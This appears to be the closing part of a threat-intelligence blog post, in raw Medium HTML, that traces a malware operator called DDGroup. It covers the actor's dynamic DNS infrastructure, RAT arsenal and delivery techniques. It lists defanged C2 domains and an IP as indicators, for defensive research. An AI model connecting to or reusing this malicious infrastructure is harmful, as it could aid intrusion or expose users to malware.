class="pq ff pr ph pi ps pt bf b bg z du">Figure 14: AxonIntel DNS history for 154.12.234.207</figcaption></figure><p id="baac" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, there are 5 additional dynamic DNS domains here. And if we look at them in VirusTotal, we would see that all of them have been associated with off-the-shelf malware like QuasarRAT, BitRat, and similar.</p><p id="5a01" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">I don’t want to bore you with the details but this search can be continued. To be totally honest with you, I have probably already lost half my hair because whenever I thought I would finally have arrived at the beginning of this actor&#x27;s career, I found another IP that has several new DynDNS Domains associated, all following the same scheme.</p><p id="22ea" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">So far I have been able to associate<strong class="mi gv"> over 110 dynamic DNS spanning over 94 IP Addresses with this actor</strong>. I am able to track this actor&#x27;s activity to late 2019 and the only reason I did not track further was because of the sheer overwhelming amount of domains and IPs in my lists. Manual tracking can only bring you this far if you want to keep your sanity ^^</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="59c6" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk"><strong class="al">Chapter 6: I am not the only one</strong></h2><p id="559c" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">What is very interesting to me is that this actor has played a role model for new attack vectors on more than one occasion. Not only is DDGroup one of the first actors to use the new WebDAV / “search-ms” technique. They also were one of the first actors to make use of the OneNote malware delivery technique back in January 2023:</p><div class="qy qz ra rb rc rd"><a href="https://isc.sans.edu/diary/A+First+Malicious+OneNote+Document/29470?source=post_page-----d3b3020625a4--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="re ab is"><div class="rf ab co cb rg rh"><h2 class="bf gv ij z py ri rj rk rl rm rn gt bk">Internet Storm Center</h2><div class="ro l"><h3 class="bf b ij z py ri rj rk rl rm rn du">Internet Storm Center Diary 2023-09-06, Author: Johannes Ullrich</h3></div><div class="rp l"><p class="bf b dv z py ri rj rk rl rm rn du">isc.sans.edu</p></div></div><div class="rq l"><div class="rr l rs rt ru rq rv ln rd"></div></div></div></a></div><p id="ccbd" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">(C2: wormxwar.ddns[.]net )</p><p id="e348" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">which was also observed by my friend and colleague 0xToxin:</p><figure class="ol om on oo op pk"><div class="px py l fj"><div class="pz qa l"></div></div></figure><p id="aaa4" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">(IP has DNS History links to: quasharr.ddns[.]net, newtryex.ddns[.]net, wormxwar.ddns[.]net, retsuportm.ddnsfree[.]com, mywormtwon.ddns[.]net, spreadrem1.ddnsfree[.]com)</p><p id="3c34" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">The same IP was mentioned in a Trellix article in regards to OneNote spreading as well:</p><div class="qy qz ra rb rc rd"><a href="https://www.trellix.com/en-us/about/newsroom/stories/research/qakbot-evolves-to-onenote-malware-distribution.html?source=post_page-----d3b3020625a4--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="re ab is"><div class="rf ab co cb rg rh"><h2 class="bf gv ij z py ri rj rk rl rm rn gt bk">Qakbot evolves to OneNote Malware Distribution</h2><div class="ro l"><h3 class="bf b ij z py ri rj rk rl rm rn du">Since the end of January 2023, there has been an upsurge in the number of Qakbot campaigns using a novel delivery…</h3></div><div class="rp l"><p class="bf b dv z py ri rj rk rl rm rn du">www.trellix.com</p></div></div><div class="rq l"><div class="rw l rs rt ru rq rv ln rd"></div></div></div></a></div><p id="f7c2" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">They also made it into a recent article by Fortinet describing the new WebDAV attack vector using infrastructure that replaced the one I described at the beginning of this blog post:</p><p id="e221" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk"><a class="af ok" href="https://www.fortinet.com/blog/threat-research/malware-distributed-via-freezers-and-syk-crypter" rel="noopener ugc nofollow" target="_blank">https://www.fortinet.com/blog/threat-research/malware-distributed-via-freezers-and-syk-crypter</a></p><p id="1a61" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Associated C2s: freshinxworm[.]ddns[.]net, churchxx[.]ddns[.]net, plunder[.]ddnsguru[.]com, plunder[.]dedyn[.]io, plunder[.]jumpingcrab[.]com, plunder[.]dynnamn[.]ru )</p><p id="e6c9" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">In the article, Fortinet also points out the use of “Freeze.rs”.</p><p id="1b68" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">With all these mentions in public reports, I can only assume why no one ever cared to have a closer look at this actor.</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="38be" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk">Chapter 7: Other Observations and Outlook</h2><p id="aaac" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">As you have seen, DDGroup is a very active actor whose activity spans over the years. The observed arsenal includes many open-source tools and commercial RATs.</p><p id="81ac" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">To give an overview, here is a list of all observed tools and malware types the actor has been using in recent years:</p><ol class=""><li id="9133" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd oz pa pb bk">Remcos RAT</li><li id="3494" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">ModiLoader / DBatLoader</li><li id="869f" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">Quasar RAT</li><li id="4a15" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">AsyncRAT</li><li id="7637" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">BitRat</li><li id="9744" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">Warzone RAT / AveMaria RAT</li><li id="a078" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">NetWire RAT</li><li id="153b" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">XWorm</li></ol><p id="4d86" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Additionally, I observed the use of:</p><ol class=""><li id="17e7" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd oz pa pb bk"><a class="af ok" href="https://github.com/optiv/Freeze.rs" rel="noopener ugc nofollow" target="_blank">https://github.com/optiv/Freeze.rs</a></li><li id="ad42" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk"><a class="af ok" href="https://github.com/sigoden/dufs" rel="noopener ugc nofollow" target="_blank">https://github.com/sigoden/dufs</a></li></ol><p id="75f5" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">While the actor currently seems to favor servers by the German Hosting Provider <a class="af ok" href="https://contabo.com/de/" rel="noopener ugc nofollow" target="_blank">Contabo</a>, there seems to be no preference in regards to Dynamic DNS providers.</p><p id="727d" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">I really hope this article will be a reason for a CTI company with more resources than me to look into this matter.</p><p id="3a09" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Meanwhile, a list of all associated C2 IP addresses, a list of all associated dynamic DNS domains, and a joint list showing their association can be found here:</p><div class="qy qz ra rb rc rd"><a href="https://github.com/Gi7w0rm/MalwareConfigLists/tree/main/DDGroup?source=post_page-----d3b3020625a4--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="re ab is"><div class="rf ab co cb rg rh"><h2 class="bf gv ij z py ri rj rk rl rm rn gt bk">MalwareConfigLists/DDGroup at main · Gi7w0rm/MalwareConfigLists</h2><div class="ro l"><h3 class="bf b ij z py ri rj rk rl rm rn du">Just some lists of Malware Configs. Contribute to Gi7w0rm/MalwareConfigLists development by creating an account on…</h3></div><div class="rp l"><p class="bf b dv z py ri rj rk rl rm rn du">github.com</p></div></div><div class="rq l"><div class="rx l rs rt ru rq rv ln rd"></div></div></div></a></div></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="0c88" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk">Chapter 9: Thank you</h2><p id="5125" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">Well, this chapter has no technical details in it. However, I have to thank some individuals for their immense help with the work on this investigation. All individuals in the list below played a role in this and I am very thankful to each and every one of them:</p><ul class=""><li id="3155" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd qb pa pb bk"><a class="af ok" href="https://twitter.com/AnFam17" rel="noopener ugc nofollow" target="_blank">RussianPanda</a></li><li id="3768" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk"><a class="af ok" href="https://twitter.com/tosscoinwitcher" rel="noopener ugc nofollow" target="_blank">Fate112</a></li><li id="e354" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk"><a class="af ok" href="https://twitter.com/aaqeel87" rel="noopener ugc nofollow" target="_blank">Ali Aqeel</a></li><li id="aeed" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk"><a class="af ok" href="https://infosec.exchange/@cxiao" rel="noopener ugc nofollow" target="_blank">cxiao</a></li><li id="6f8c" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk"><a class="af ok" href="https://twitter.com/fr0gger_" rel="noopener ugc nofollow" target="_blank">fr0gger</a></li><li id="217f" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk"><a class="af ok" href="https://twitter.com/Israel_Torres" rel="noopener ugc nofollow" target="_blank">Israel Torres</a></li></ul><p id="5a4a" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">I also want to thank every reader of this post who makes it to the end. I always hope to make these posts entertaining and educational but this is by far my longest piece so far and if you made it here I really appreciate having had your attention.</p><p id="fdc8" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Before you go, you might want to check out my link tree: <a class="af ok" href="https://linktr.ee/gi7w0rm" rel="noopener ugc nofollow" target="_blank">https://linktr.ee/gi7w0rm</a> or consider a donation via <a class="af ok" href="https://ko-fi.com/gi7w0rm" rel="noopener ugc nofollow" target="_blank">Kofi</a> to help me finance my research.</p><p id="0932" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Have a nice day. <br/>Cheers ❤</p><p id="eb87" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">((*)Disclaimer: I am not in any way or form affiliated with Validin LLC, but I have known their CEO for a while and I really like the work they do. Check them out here: <a class="af ok" href="https://validin.com/" rel="noopener ugc nofollow" target="_blank">https://validin.com/</a> )</p></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ry rz ab iv"><div class="ro ab"><a class="sa ay am ao" href="https://medium.com/tag/cybersecurity?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><div class="sb fj cx sc ge sd se bf b bg z bk sf">Cybersecurity</div></a></div><div class="ro ab"><a class="sa ay am ao" href="https://medium.com/tag/malware?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><div class="sb fj cx sc ge sd se bf b bg z bk sf">Malware</div></a></div><div class="ro ab"><a class="sa ay am ao" href="https://medium.com/tag/threat-intelligence?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><div class="sb fj cx sc ge sd se bf b bg z bk sf">Threat Intelligence</div></a></div><div class="ro ab"><a class="sa ay am ao" href="https://medium.com/tag/ioc?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><div class="sb fj cx sc ge sd se bf b bg z bk sf">Ioc</div></a></div><div class="ro ab"><a class="sa ay am ao" href="https://medium.com/tag/technology?source=post_page-----d3b3020625a4--------------------------------" rel="noopener follow"><div class="sb fj cx sc ge sd se bf b bg z bk sf">Technology</div></a></div></div></div></div><div class="l"></div><footer class="sg sh si sj sk sl sm sn so ab q sp sq c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp sr"><div class="ab q ke"><div class="ss l"><span class="l st su sv e d"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fd3b3020625a4&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---footer_actions--d3b3020625a4---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span><span class="l h g f sw sx"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fd3b3020625a4&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---footer_actions--d3b3020625a4---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="nl l is"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fd3b3020625a4&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;source=---footer_actions--d3b3020625a4---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="nl l is"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="sy sz ta tb tc l bx"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="cl ab td cp"><div class="ab ia"><a rel="noopener follow" href="/?source=post_page---post_author_info--d3b3020625a4--------------------------------"><div class="l te tf by tg ie"><div class="l fj"><img alt="Gi7w0rm" class="l fd by th ti cx" src="https://miro.medium.com/v2/resize:fill:144:144/1*XNZYIunppMSwHbb0Dxx3cA.png" width="72" height="72" loading="lazy"/><div class="if by l th ti fs n ig ft"></div></div></div></a></div><div class="j i d"><div class="ab"><span><button class="bf b bg z ep sb eq er es et eu ev ew ex ey ez fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F3a4e97b76a4b&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;newsletterV3=fa7639fc99f0&amp;newsletterV3Id=3a4e97b76a4b&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---post_author_info--d3b3020625a4---------------------subscribe_user-----------" rel="noopener follow"><button class="bf b bg z tm am tn to tp tq tr ts tt tu ew ex ey ez fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="tj tk tl"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="ab cn cp"><div class="l"><div class="ab q"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/?source=post_page---post_author_info--d3b3020625a4--------------------------------"><h2 class="pw-author-name bf tv tw tx ty bk"><span class="gn ix">Written by <!-- -->Gi7w0rm</span></h2></a></div><div class="ro ab"><div class="l is"><span class="pw-follower-count bf b bg z bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/followers?source=post_page---post_author_info--d3b3020625a4--------------------------------">193 Followers</a></span></div></div><div class="tz l"></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z ep sb eq er es et eu ev ew ex ey ez fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F3a4e97b76a4b&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;newsletterV3=fa7639fc99f0&amp;newsletterV3Id=3a4e97b76a4b&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---post_author_info--d3b3020625a4---------------------subscribe_user-----------" rel="noopener follow"><button class="bf b bg z tm am tn to tp tq tr ts tt tu ew ex ey ez fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="tj tk tl"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="ua bh ub uc ud ue uf ug"></div></div></div><div class="h k j"><div class="ua bh ub uh"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ui ab ke iv"><div class="uj uk l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----d3b3020625a4--------------------------------" 